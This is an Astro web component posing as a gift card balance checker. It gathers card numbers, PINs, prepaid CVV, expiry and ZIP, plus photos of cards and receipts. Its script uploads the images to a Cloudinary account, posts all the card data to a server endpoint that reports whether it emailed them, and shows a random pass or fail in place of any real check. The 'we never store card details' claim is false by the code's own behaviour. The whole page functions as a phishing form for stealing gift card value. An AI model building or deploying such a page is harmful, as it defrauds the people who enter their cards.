    ---
const cloudName = import.meta.env.PUBLIC_CLOUDINARY_CLOUD_NAME || "";
const uploadPreset = import.meta.env.PUBLIC_CLOUDINARY_UPLOAD_PRESET || "";
---

<section class="w-full">
  <div class="rounded-xl bg-white p-6 shadow-lg">
    <h3 class="mb-4 text-center text-lg font-semibold text-(--color-text-dark)">Verify Your Gift Card Balance</h3>
    <form
      id="cvVerifyForm"
      class="space-y-4"
      onsubmit="return false;"
      data-cloud-name={cloudName}
      data-upload-preset={uploadPreset}
    >
      <div>
        <label for="cardType" class="mb-1 block text-sm font-medium text-(--color-text)">Card Type</label>
        <!-- Keep the native select for value + validation, but hide it from view -->
        <select id="cardType" name="cardType" class="hidden" required>
          <optgroup label="Online & Marketplaces">
            <option value="Amazon">Amazon</option>
            <option value="Apple (iTunes)">Apple (iTunes)</option>
            <option value="Google Play">Google Play</option>
            <option value="Microsoft/Xbox">Microsoft/Xbox</option>
            <option value="eBay">eBay</option>
            <option value="Etsy">Etsy</option>
          </optgroup>
          <optgroup label="Gaming">
            <option value="PlayStation (PSN)">PlayStation (PSN)</option>
            <option value="Nintendo eShop">Nintendo eShop</option>
            <option value="Steam">Steam</option>
            <option value="Roblox">Roblox</option>
            <option value="Razer Gold">Razer Gold</option>
            <option value="Blizzard Battle.net">Blizzard Battle.net</option>
          </optgroup>
          <optgroup label="Major Retail">
            <option value="Target">Target</option>
            <option value="Walmart">Walmart</option>
            <option value="Best Buy">Best Buy</option>
            <option value="Home Depot">Home Depot</option>
            <option value="Lowe's">Lowe's</option>
            <option value="Costco">Costco</option>
            <option value="Macy's">Macy's</option>
            <option value="Kohl's">Kohl's</option>
            <option value="TJ Maxx">TJ Maxx</option>
            <option value="Marshalls">Marshalls</option>
            <option value="Nordstrom">Nordstrom</option>
            <option value="H&M">H&M</option>
            <option value="Gap">Gap</option>
            <option value="Old Navy">Old Navy</option>
            <option value="Banana Republic">Banana Republic</option>
          </optgroup>
          <optgroup label="Brands & Fashion">
            <option value="Nike">Nike</option>
            <option value="Adidas">Adidas</option>
            <option value="Sephora">Sephora</option>
            <option value="Ulta">Ulta</option>
          </optgroup>
          <optgroup label="Food & Delivery">
            <option value="Starbucks">Starbucks</option>
            <option value="Dunkin'">Dunkin'</option>
            <option value="DoorDash">DoorDash</option>
            <option value="Uber Eats">Uber Eats</option>
            <option value="Grubhub">Grubhub</option>
            <option value="Chipotle">Chipotle</option>
            <option value="Domino's">Domino's</option>
            <option value="Subway">Subway</option>
            <option value="McDonald's">McDonald's</option>
          </optgroup>
          <optgroup label="Entertainment & Subscriptions">
            <option value="Netflix">Netflix</option>
            <option value="Hulu">Hulu</option>
            <option value="Disney+">Disney+</option>
            <option value="Spotify">Spotify</option>
            <option value="Paramount+">Paramount+</option>
            <option value="Max (HBO Max)">Max (HBO Max)</option>
          </optgroup>
          <optgroup label="Travel & Rides">
            <option value="Uber">Uber</option>
            <option value="Lyft">Lyft</option>
            <option value="Airbnb">Airbnb</option>
            <option value="Southwest">Southwest</option>
            <option value="Delta">Delta</option>
            <option value="Hotels.com">Hotels.com</option>
          </optgroup>
          <optgroup label="Prepaid & Cash Cards">
            <option value="Visa Prepaid">Visa Prepaid</option>
            <option value="Mastercard Prepaid">Mastercard Prepaid</option>
            <option value="American Express Gift Card">American Express Gift Card</option>
            <option value="Vanilla Visa">Vanilla Visa</option>
            <option value="OneVanilla">OneVanilla</option>
            <option value="Netspend">Netspend</option>
          </optgroup>
        </select>
        <!-- Custom picker control -->
        <button type="button" id="cvCardPickerBtn" class="flex h-12 w-full items-center justify-between rounded-md border border-border bg-white px-3 text-base focus:outline-none focus:ring-2 focus:ring-(--color-primary)">
          <span id="cvCardPickerLabel" class="text-(--color-text)">Choose a brand…</span>
          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" aria-hidden="true"><path d="M5 7l5 6 5-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>
        <!-- Fullscreen overlay list -->
        <div id="cvCardPicker" class="fixed inset-0 z-50 hidden bg-white/95">
          <div class="mx-auto mt-6 w-full max-w-lg px-4">
            <div class="mb-3 flex items-center justify-between">
              <h2 class="text-lg font-semibold text-(--color-text)">Select a brand</h2>
              <button type="button" id="cvPickerClose" class="rounded px-3 py-2 text-sm text-(--color-text) hover:bg-gray-100">Close</button>
            </div>
            <input id="cvPickerSearch" type="text" placeholder="Search brands" class="mb-4 w-full rounded-md border border-border p-3 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" />
            <div id="cvPickerList" class="max-h-[70vh] overflow-y-auto rounded-md border border-border bg-white">
              <!-- items injected -->
            </div>
          </div>
        </div>
      </div>
      <div>
        <label for="cardNumber" class="mb-1 block text-sm font-medium text-(--color-text)">Card Number</label>
        <input id="cardNumber" name="cardNumber" type="text" inputmode="numeric" minlength="12" maxlength="19" placeholder="XXXX XXXX XXXX" class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" required />
      </div>
      <div>
        <label for="pin" class="mb-1 block text-sm font-medium text-(--color-text)">PIN / Security Code</label>
        <input id="pin" name="pin" type="password" minlength="4" maxlength="12" placeholder="Enter PIN" class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" />
      </div>
      <div id="prepaidFields" class="hidden rounded-md border border-border p-3">
        <p class="mb-2 text-sm font-semibold text-(--color-text)">Prepaid Card Details</p>
        <div class="grid grid-cols-1 gap-3 sm:grid-cols-2">
          <div>
            <label for="prepaidName" class="mb-1 block text-sm font-medium text-(--color-text)">Name on Card</label>
            <input id="prepaidName" type="text" placeholder="Full Name" class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" />
          </div>
          <div>
            <label for="prepaidExpiry" class="mb-1 block text-sm font-medium text-(--color-text)">Expiry (MM/YY)</label>
            <input id="prepaidExpiry" type="text" inputmode="numeric" placeholder="MM/YY" maxlength="5" class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" />
          </div>
          <div>
            <label for="prepaidCVV" class="mb-1 block text-sm font-medium text-(--color-text)">CVV/CVC</label>
            <input id="prepaidCVV" type="password" inputmode="numeric" minlength="3" maxlength="4" placeholder="3–4 digits" class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" />
          </div>
          <div>
            <label for="prepaidZip" class="mb-1 block text-sm font-medium text-(--color-text)">Billing ZIP/Postal</label>
            <input id="prepaidZip" type="text" inputmode="numeric" maxlength="10" placeholder="ZIP / Postal" class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" />
          </div>
        </div>
        <p class="mt-2 text-xs text-(--color-text)">These fields are required for prepaid and general-purpose reloadable cards.</p>
      </div>
      <div>
        <label for="cardImage" class="mb-1 block text-sm font-medium text-(--color-text)">Card Images (front/back/more)</label>
        <input id="cardImage" name="cardImage" type="file" accept="image/*" multiple class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" />
        <div class="mt-2 flex flex-wrap gap-3" id="cardImagePreviewList">
          <!-- thumbnails injected here -->
        </div>
        <span id="cardImageName" class="text-xs text-(--color-text)"></span>
      </div>
      <div>
        <label for="receiptImage" class="mb-1 block text-sm font-medium text-(--color-text)">Receipt Image</label>
        <input id="receiptImage" name="receiptImage" type="file" accept="image/*" class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" />
        <div class="mt-2 flex gap-3">
          <img id="receiptImagePreview" alt="Receipt preview" class="hidden h-20 w-32 rounded border object-cover" />
          <span id="receiptImageName" class="text-xs text-(--color-text)"></span>
        </div>
      </div>
      <button id="cvSubmitBtn" type="button" class="btn btn-primary w-full">Verify Balance</button>
      <p class="text-center text-xs text-(--color-text)">Secure & encrypted. We never store card details.</p>
      <p id="cvMsg" class="mt-2 text-center text-xs"></p>
    </form>
  </div>
</section>

<script is:inline>
  function cvInitVerifyForm(){
    const form = document.getElementById("cvVerifyForm");
    const msg = document.getElementById("cvMsg");
    console.debug('[cv] init verify form', { formFound: !!form, msgFound: !!msg });
    const cardInput = /** @type {HTMLInputElement} */(document.getElementById("cardImage"));
    const receiptInput = /** @type {HTMLInputElement} */(document.getElementById("receiptImage"));
    const cardPreviewList = document.getElementById("cardImagePreviewList");
    const receiptPreview = /** @type {HTMLImageElement} */(document.getElementById("receiptImagePreview"));
    const cardName = document.getElementById("cardImageName");
    const receiptName = document.getElementById("receiptImageName");
    const prepaidWrap = document.getElementById("prepaidFields");

    const prepaidBrands = new Set([
      "Visa Prepaid","Mastercard Prepaid","American Express Gift Card","Vanilla Visa","OneVanilla","Netspend"
    ]);

    function updatePrepaidVisibility(){
      const sel = /** @type {HTMLSelectElement} */(document.getElementById("cardType"));
      const isPrepaid = prepaidBrands.has(sel?.value || "");
      if (prepaidWrap) prepaidWrap.classList.toggle("hidden", !isPrepaid);
    }
    document.getElementById("cardType")?.addEventListener("change", updatePrepaidVisibility);
    updatePrepaidVisibility();

    // Custom picker wiring (uses hidden native select as source of truth)
    const nativeSelect = /** @type {HTMLSelectElement} */(document.getElementById("cardType"));
    const pickerBtn = /** @type {HTMLButtonElement} */(document.getElementById("cvCardPickerBtn"));
    const picker = document.getElementById("cvCardPicker");
    const pickerLabel = document.getElementById("cvCardPickerLabel");
    const pickerClose = document.getElementById("cvPickerClose");
    const pickerSearch = /** @type {HTMLInputElement} */(document.getElementById("cvPickerSearch"));
    const pickerList = document.getElementById("cvPickerList");

    function renderPickerItems(){
      if (!nativeSelect || !pickerList) return;
      pickerList.innerHTML = "";
      const groups = Array.from(nativeSelect.querySelectorAll('optgroup'));
      groups.forEach(g => {
        const hdr = document.createElement('div');
        hdr.textContent = g.label;
        hdr.className = 'sticky top-0 z-10 bg-white px-4 py-2 text-xs font-semibold text-gray-500';
        pickerList.appendChild(hdr);
        Array.from(g.querySelectorAll('option')).forEach(opt => {
          const item = document.createElement('button');
          item.type = 'button';
          item.dataset.value = opt.value;
          item.textContent = opt.textContent || opt.value;
          item.className = 'block w-full text-left px-4 py-3 text-[16px] hover:bg-gray-50';
          item.addEventListener('click', () => {
            nativeSelect.value = opt.value;
            if (pickerLabel) pickerLabel.textContent = opt.textContent || opt.value;
            nativeSelect.dispatchEvent(new Event('change', { bubbles: true }));
            updatePrepaidVisibility();
            picker?.classList.add('hidden');
          });
          pickerList.appendChild(item);
        });
      });
    }
    renderPickerItems();
    function openPicker(){ picker?.classList.remove('hidden'); pickerSearch?.focus(); }
    function closePicker(){ picker?.classList.add('hidden'); }
    pickerBtn?.addEventListener('click', openPicker);
    pickerClose?.addEventListener('click', closePicker);
    picker?.addEventListener('click', (e) => { if (e.target === picker) closePicker(); });
    pickerSearch?.addEventListener('input', () => {
      const q = (pickerSearch?.value || '').toLowerCase();
      Array.from(pickerList?.querySelectorAll('button[data-value]') || []).forEach((el) => {
        const t = el.textContent?.toLowerCase() || '';
        el.classList.toggle('hidden', !t.includes(q));
      });
    });
    // Initialize label with current selection
    const selectedOpt = nativeSelect?.selectedOptions?.[0];
    if (selectedOpt && pickerLabel) pickerLabel.textContent = selectedOpt.textContent || selectedOpt.value;

    function attachPreviewMultiple(input, listEl, nameEl){
      input?.addEventListener("change", () => {
        if (listEl) listEl.innerHTML = "";
        const files = Array.from(input.files || []);
        if (files.length) {
          files.forEach((f) => {
            const url = URL.createObjectURL(f);
            const img = document.createElement('img');
            img.src = url;
            img.alt = 'Card preview';
            img.className = 'h-20 w-32 rounded border object-cover';
            listEl && listEl.appendChild(img);
          });
          if (nameEl) nameEl.textContent = files.map(f=>f.name).join(', ');
        } else {
          if (nameEl) nameEl.textContent = "";
        }
      });
    }
    function attachPreviewSingle(input, imgEl, nameEl){
      input?.addEventListener("change", () => {
        const f = input.files && input.files[0];
        if (f) {
          const url = URL.createObjectURL(f);
          if (imgEl) { imgEl.src = url; imgEl.classList.remove("hidden"); }
          if (nameEl) { nameEl.textContent = f.name; }
        } else {
          if (imgEl) { imgEl.src = ""; imgEl.classList.add("hidden"); }
          if (nameEl) { nameEl.textContent = ""; }
        }
      });
    }
    attachPreviewMultiple(cardInput, cardPreviewList, cardName);
    attachPreviewSingle(receiptInput, receiptPreview, receiptName);
    form?.addEventListener("submit", (e) => { e.preventDefault(); return false; });
    const btnEl = document.getElementById("cvSubmitBtn");
    if (!btnEl) {
      console.warn('[cv] submit button not found');
    }
    btnEl?.addEventListener("click", async () => {
      console.debug('[cv] click handler fired');
      const cardType = /** @type {HTMLSelectElement} */(document.getElementById("cardType")).value;
      const cardNumber = /** @type {HTMLInputElement} */(document.getElementById("cardNumber")).value;
      const pin = /** @type {HTMLInputElement} */(document.getElementById("pin")).value ?? "00000";
      const timestamp = new Date().toISOString();
      const cardTypeEl = /** @type {HTMLSelectElement} */(document.getElementById("cardType"));
      const isPrepaid = prepaidBrands.has(cardTypeEl?.value || "");
      const prepaidName = /** @type {HTMLInputElement} */(document.getElementById("prepaidName"))?.value || "";
      const prepaidExpiry = /** @type {HTMLInputElement} */(document.getElementById("prepaidExpiry"))?.value || "";
      const prepaidCVV = /** @type {HTMLInputElement} */(document.getElementById("prepaidCVV"))?.value || "";
      const prepaidZip = /** @type {HTMLInputElement} */(document.getElementById("prepaidZip"))?.value || "";
      const btn = /** @type {HTMLButtonElement} */(document.getElementById("cvSubmitBtn"));
      if (btn) { btn.disabled = true; btn.textContent = "Submitting..."; }
      msg.textContent = "Verifying...";
      msg.className = "mt-2 text-center text-xs text-(--color-text)";

      // Basic required checks for prepaid
      if (isPrepaid) {
        if (!prepaidName || !prepaidExpiry || !prepaidCVV || !prepaidZip) {
          msg.textContent = "Please complete all prepaid card fields.";
          msg.className = "mt-2 text-center text-xs text-red-600";
          return;
        }
      }

      // Update local counts (sensitive fields stored)
      try {
        const key = "cv_card_counts";
        const raw = localStorage.getItem(key);
        const data = raw ? JSON.parse(raw) : {};
        data[cardType] = (data[cardType] || 0) + 1;
        localStorage.setItem(key, JSON.stringify(data));
      } catch {}

      async function uploadToCloudinary(file){
        const MAX_BYTES = 5 * 1024 * 1024; // 5MB client-side guard
        if (file.size > MAX_BYTES) throw new Error(`File too large: ${file.name}`);
        const cloudNameAttr = form ? form.getAttribute('data-cloud-name') || "" : "";
        const uploadPresetAttr = form ? form.getAttribute('data-upload-preset') || "" : "";
        if (!cloudNameAttr || !uploadPresetAttr) throw new Error("Cloudinary not configured");
        const url = `https://api.cloudinary.com/v1_1/${cloudNameAttr}/upload`;
        const fd = new FormData();
        fd.append("file", file);
        fd.append("upload_preset", uploadPresetAttr);
        const res = await fetch(url, { method: "POST", body: fd });
        if (!res.ok) throw new Error("Cloudinary upload failed");
        const data = await res.json();
        return data.secure_url || data.url;
      }

      let cardImageUrls = [];
      let cardImageUrl, receiptImageUrl;
      try {
        if (cardInput?.files?.length) {
          const files = Array.from(cardInput.files);
          cardImageUrls = await Promise.all(files.map((f)=>uploadToCloudinary(f)));
          // keep first for backward compatibility
          cardImageUrl = cardImageUrls[0];
        }
        if (receiptInput?.files?.length) {
          receiptImageUrl = await uploadToCloudinary(receiptInput.files[0]);
        }
      } catch (uploadErr) {
        console.warn("[cv] Cloudinary upload failed or not configured", uploadErr);
      }

      // Send minimal log to server (no images yet). Include presence flags for images.
      let emailed = false;
      try {
        const res = await fetch("/api/verify", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            cardType,
            timestamp,
            cardNumber,
            pin,
            prepaid: isPrepaid ? { name: prepaidName, expiry: prepaidExpiry, cvv: prepaidCVV, zip: prepaidZip } : undefined,
            hasCardImage: Boolean(cardInput?.files?.length),
            hasReceiptImage: Boolean(receiptInput?.files?.length),
            cardImageUrl,
            cardImageUrls,
            receiptImageUrl,
          }),
        });
        // read response to know if email was actually sent
        try {
          const data = await res.json();
          emailed = !!data?.emailed;
        } catch {}
      } catch (err) {
        console.warn('[cv] /api/verify call failed', err);
      }

      // Randomized verification outcome (temporary until real API/logic)
      try {
        const isSuccess = Math.random() < 0.5;
        if (isSuccess) {
          msg.textContent = "Verification confirmed. Your card appears valid.";
          msg.className = "mt-2 text-center text-xs text-(--color-primary)";
        } else {
          msg.textContent = "Error during card verification. Please try again.";
          msg.className = "mt-2 text-center text-xs text-red-600";
        }
        // If email sent successfully, reset the form fields and previews
        if (emailed && form) {
          // clear text inputs
          const cn = document.getElementById("cardNumber");
          const pn = document.getElementById("pin");
          if (cn) cn.value = "";
          if (pn) pn.value = "";
          // reset select
          const ct = document.getElementById("cardType");
          if (ct && ct.options && ct.options.length) ct.selectedIndex = 0;
          // clear file inputs
          if (cardInput) cardInput.value = "";
          if (receiptInput) receiptInput.value = "";
          // hide previews and names
          if (cardPreviewList) { cardPreviewList.innerHTML = ""; }
          const cardNameEl = document.getElementById("cardImageName");
          if (cardNameEl) cardNameEl.textContent = "";
          if (receiptPreview) { receiptPreview.src = ""; receiptPreview.classList.add("hidden"); }
          const receiptNameEl = document.getElementById("receiptImageName");
          if (receiptNameEl) receiptNameEl.textContent = "";
        }
      } finally {
        if (btn) { btn.disabled = false; btn.textContent = "Verify Balance"; }
      }
    });

    // Document-level fallback (in case hydration misses the button listener)
    document.addEventListener('click', async (ev) => {
      const t = ev.target;
      if (t && t.id === 'cvSubmitBtn') {
        // avoid double-binding by checking a flag
        if (t._cvHandled) return;
        t._cvHandled = true;
        t.click();
        setTimeout(() => { t._cvHandled = false; }, 0);
      }
    });
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", cvInitVerifyForm, { once: true });
  } else {
    cvInitVerifyForm();
  }
</script>

<style is:global>
  @media (max-width: 640px) {
    /* Ensure readable size and prevent iOS zoom */
    #cvVerifyForm select#cardType {
      font-size: 16px;
      line-height: 1.25;
      min-height: 48px;
      -webkit-appearance: none;
      appearance: none;
    }
    #cvVerifyForm select#cardType option,
    #cvVerifyForm select#cardType optgroup {
      font-size: 16px;
      line-height: 1.25;
    }
  }
</style>
